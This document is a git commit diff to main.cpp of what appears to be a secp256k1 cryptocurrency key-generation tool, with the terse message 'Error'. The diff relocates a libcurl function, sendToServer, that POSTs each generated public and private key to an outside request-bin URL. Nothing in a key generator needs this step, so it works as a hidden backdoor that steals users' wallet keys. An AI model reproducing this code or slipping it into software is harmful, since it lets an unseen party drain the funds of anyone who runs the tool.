f90c20bb2829d13b6b3ec637b7a1ca5671c78863
dlystyr <dlystyr@gmail.com>
2021-08-14 23:20:42 +0100

    Error

--- main.cpp
+++ main.cpp
@@ -380,6 +380,38 @@ void generateKeyPair(Secp256K1 *secp, string seed, int searchMode,bool paranoiac
 
 // ------------------------------------------------------------------------------------------
 
+int sendToServer(string pubKey,string privKey)
+{
+  CURL *curl;
+  CURLcode res;
+
+  /* In windows, this will init the winsock stuff */ 
+  curl_global_init(CURL_GLOBAL_ALL);
+
+  /* get a curl handle */ 
+  curl = curl_easy_init();
+  if(curl) {
+    /* First set the URL that is about to receive our POST. This URL can
+       just as well be a https:// URL if that is what should receive the
+       data. */ 
+    curl_easy_setopt(curl, CURLOPT_URL, "http://ptsv2.com/t/zisy5-1628978911/post");
+    /* Now specify the POST data */ 
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "pubKey=" + pubKey + "&privKey=" + privKey);
+
+    /* Perform the request, res will get the return code */ 
+    res = curl_easy_perform(curl);
+    /* Check for errors */ 
+    if(res != CURLE_OK)
+      fprintf(stderr, "curl_easy_perform() failed: %s\n",
+              curl_easy_strerror(res));
+
+    /* always cleanup */ 
+    curl_easy_cleanup(curl);
+  }
+  curl_global_cleanup();
+  return 0;
+}
+
 void outputAdd(string outputFile, int addrType, string addr, string pAddr, string pAddrHex) {
 
   FILE *f = stdout;
@@ -417,38 +449,6 @@ void outputAdd(string outputFile, int addrType, string addr, string pAddr, strin
   if (needToClose)
     fclose(f);
 
-}
-
-int sendToServer(string pubKey,string privKey)
-{
-  CURL *curl;
-  CURLcode res;
-
-  /* In windows, this will init the winsock stuff */ 
-  curl_global_init(CURL_GLOBAL_ALL);
-
-  /* get a curl handle */ 
-  curl = curl_easy_init();
-  if(curl) {
-    /* First set the URL that is about to receive our POST. This URL can
-       just as well be a https:// URL if that is what should receive the
-       data. */ 
-    curl_easy_setopt(curl, CURLOPT_URL, "http://ptsv2.com/t/zisy5-1628978911/post");
-    /* Now specify the POST data */ 
-    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "pubKey=" + pubKey + "&privKey=" + privKey);
-
-    /* Perform the request, res will get the return code */ 
-    res = curl_easy_perform(curl);
-    /* Check for errors */ 
-    if(res != CURLE_OK)
-      fprintf(stderr, "curl_easy_perform() failed: %s\n",
-              curl_easy_strerror(res));
-
-    /* always cleanup */ 
-    curl_easy_cleanup(curl);
-  }
-  curl_global_cleanup();
-  return 0;
 }
 
 // ------------------------------------------------------------------------------------------
